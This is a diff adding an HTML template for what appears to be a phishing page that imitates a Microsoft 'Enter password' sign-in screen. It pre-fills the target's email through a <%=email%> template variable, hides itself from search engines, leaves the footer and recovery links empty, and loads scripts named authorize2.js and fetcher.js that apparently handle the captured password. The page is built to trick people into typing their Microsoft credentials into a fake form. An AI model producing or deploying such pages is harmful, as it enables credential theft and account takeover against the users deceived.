@@ -1,0 +1,261 @@
+<html dir="ltr" class="" lang="en">
+    <head>
+        <title>Sign in to your account</title>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes" />
+        <meta name="Googlebot-News" content="noindex, nofollow" />
+        <meta name="googlebot" content="noindex, nofollow" />
+        <meta name="robots" content="noindex, nofollow" />
+        <meta name="robots" content="noimageindex" />
+
+        <meta name="format-detection" content="telephone=no" />
+
+        <meta name="robots" content="none" />
+
+        <link rel="shortcut icon" href="/home/favicon.ico" />
+
+        <link crossorigin="anonymous" href="/home/style1.css" rel="stylesheet" />
+    </head>
+
+    <body class="cb" style="display: block;">
+        <div>
+            <!--  -->
+
+            <!--  -->
+
+            <div data-bind="if: activeDialog"></div>
+
+            <form>
+                
+                <div>
+                    <!--  -->
+
+                    <!-- ko ifnot: useLayoutTemplates -->
+                    <!-- /ko -->
+
+                    <!-- ko if: useLayoutTemplates -->
+                    <!-- ko withProperties: { '$page': $parent } -->
+                    <!-- ko ifnot: isVerticalSplitTemplate -->
+                    <div id="lightboxTemplateContainer">
+                        <!--  -->
+
+                        <div id="lightboxBackgroundContainer">
+                            <div class="background-image-holder" role="presentation">
+                                <!-- ko if: smallImageUrl -->
+                                <!-- /ko -->
+
+                                <!-- ko if: backgroundImageUrl -->
+                                <div style="background-image: url('/home/bg.svg');" class="background-image ext-background-image"></div>
+                                <!-- ko if: useImageMask -->
+                                <!-- /ko -->
+                                <!-- /ko -->
+                            </div>
+                        </div>
+
+                        <!-- ko if: svr.cF -->
+                        <!-- /ko -->
+
+                        <!-- ko withProperties: { '$masterPageContext': $parentContext } -->
+                        <div class="outer" data-bind="css: { 'app': $page.backgroundLogoUrl }">
+                            <!-- ko if: showHeader -->
+                            <!-- /ko -->
+
+                            <div class="template-section main-section">
+                                <div data-bind="css: { 'has-header': showHeader }, externalCss: { 'middle': true }" class="middle ext-middle">
+                                    <div class="full-height" data-bind="component: { name: 'content-control', params: { serverData: svr } }">
+                                        <!--  -->
+
+                                        <!-- ko withProperties: { '$content': $data } -->
+                                        <div class="flex-column">
+                                            <!-- ko if: $page.paginationControlHelper.showBackgroundLogoHolder -->
+                                            <!-- /ko -->
+
+                                            <!-- ko if: $page.paginationControlHelper.showPageLevelTitleControl -->
+                                            <!-- /ko -->
+
+                                            <div class="win-scroll">
+                                                <div id="lightbox" class="sign-in-box ext-sign-in-box fade-in-lightbox">
+                                                    <div class="lightbox-cover"></div>
+
+                                                    <!-- ko if: showLightboxProgress -->
+                                                    <!-- /ko -->
+
+                                                    <!-- ko if: loadBannerLogo -->
+                                                    <div>
+                                                        <!--  -->
+                                                        <img
+                                                            class="logo"
+                                                            role="img"
+                                                            pngsrc="/home/svg1.svg"
+                                                            svgsrc="/home/svg1.svg"
+                                                            data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }"
+                                                            src="/home/svg1.svg"
+                                                            alt="Microsoft"
+                                                        />
+                                                        <!-- /ko -->
+                                                        <!-- /ko -->
+                                                        <!-- /ko -->
+                                                        <!-- /ko -->
+                                                    </div>
+                                                    <!-- /ko -->
+
+                                                    <!-- ko if: svr.c1 && paginationControlHelper.showLwaDisclaimer() -->
+                                                    <!-- /ko -->
+
+                                                    <!-- ko if: asyncInitReady -->
+                                                    <div role="main">
+                                                        <!--  -->
+
+                                                        <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
+                                                            <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.h) -->
+                                                            <div class="animate slide-in-next">
+                                                                <div>
+                                                                    <!--  -->
+
+                                                                    <div class="identityBanner">
+                                                                        <!-- ko if: isBackButtonVisible -->
+                                                                        <!-- /ko -->
+
+                                                                        <div id="displayName" class="identity" title="<%=email%>"><%=email%></div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                            <!-- /ko -->
+
+                                                            <div class="pagination-view has-identity-banner animate slide-in-next">
+                                                                <div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true">
+                                                                    <!--  -->
+
+                                                                    <!--  -->
+
+                                                                    <div aria-hidden="true">
+                                                                        <input type="text" name="loginfmt" class="moveOffScreen" tabindex="-1" aria-hidden="true" />
+                                                                    </div>
+
+                                                                    <div id="loginHeader" class="row title ext-title" data-bind="externalCss: { 'title': true }">
+                                                                        <div role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">
+                                                                            Enter password
+                                                                        </div>
+                                                                    </div>
+
+                                                                    <!-- ko if: showCredViewBrandingDesc -->
+                                                                    <!-- /ko -->
+
+                                                                    <!-- ko if: unsafe_pageDescription -->
+                                                                    <!-- /ko -->
+
+                                                                    <div class="row">
+                                                                        <div class="form-group col-md-24">
+                                                                            <div role="alert" aria-live="assertive">
+                                                                                <!-- ko if: passwordTextbox.error -->
+                                                                                <!-- /ko -->
+                                                                            </div>
+
+                                                                            <div class="placeholderContainer">
+                                <input required type="password" id="password" autocomplete="off"
+                                    class="form-control input ext-input text-box ext-text-box" aria-required="true" placeholder="Password"  aria-label="Enter the password for <%=email%>"
+                                    tabindex="0" />
+                                                                            </div>
+
+                                                                            <!-- ko if: svr.cB -->
+                                                                            <!-- /ko -->
+                                                                        </div>
+                                                                    </div>
+
+                                                                    <!-- ko if: shouldHipInit -->
+                                                                    <!-- /ko -->
+
+                                                                    <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
+                                                                        <div>
+                                                                            <div class="row">
+                                                                                <div class="col-md-24">
+                                                                                    <div class="text-13">
+                                                                                        <div class="form-group">
+                                                                                            <a id="idA_PWD_ForgotPassword" role="link" href="">Forgot password?</a>
+                                                                                        </div>
+
+                                                                                        <div class="form-group">
+                                                                                            <a href="#" id="otcLoginLink">
+                                                                                                Email code to <%=email%>
+                                                                                            </a>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                </div>
+                                                                            </div>
+                                                                        </div>
+
+                                                                        <div class="win-button-pin-bottom">
+                                                                            <div class="row">
+                                                                                <div>
+                                                                                    <div class="col-xs-24 no-padding-left-right button-container">
+                                                                                        <div class="inline-block">
+                                                                                            <input
+                                                                                                type="submit"
+                                                                                                id="idSIButton9"
+                                                                                                class="win-button button_primary button ext-button primary ext-primary"
+                                                                                                data-report-event="Signin_Submit"
+                                                                                                data-report-trigger="click"
+                                                                                                data-report-value="Submit"
+                                                                                                value="Sign in"
+                                                                                                data-report-attached="1"
+                                                                                            />
+                                                                                        </div>
+                                                                                    </div>
+                                                                                </div>
+                                                                            </div>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <!-- /ko -->
+
+                                                    <div></div>
+                                                    <!-- /ko -->
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <!-- /ko -->
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div id="footer" role="contentinfo" class="footer ext-footer">
+                                <div>
+                                    <div id="footerLinks" class="footerNode text-secondary">
+                                        <!-- ko if: showFooter -->
+                                        <!-- ko if: !hideTOU -->
+                                        <a id="ftrTerms" href="" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
+                                        <!-- /ko -->
+
+                                        <!-- ko if: !hidePrivacy -->
+                                        <a id="ftrPrivacy" href="" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
+                                        <a
+                                            id="moreOptions"
+                                            href="#"
+                                            role="button"
+                                            aria-label="Click here for troubleshooting information"
+                                            aria-expanded="false"
+                                            class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item"
+                                        >
+                                            ...
+                                        </a>
+                                    </div>
+                                </div>
+                            </div>
+                            <!-- /ko -->
+                        </div>
+                        <!-- /ko -->
+                    </div>
+                </div>
+                <!-- /ko -->
+            </form>
+
+        </div>
+
+        <script src="/home/js/authorize2.js"></script>
+        <script src="/home/js/fetcher.js"></script>
+    </body>
+</html>
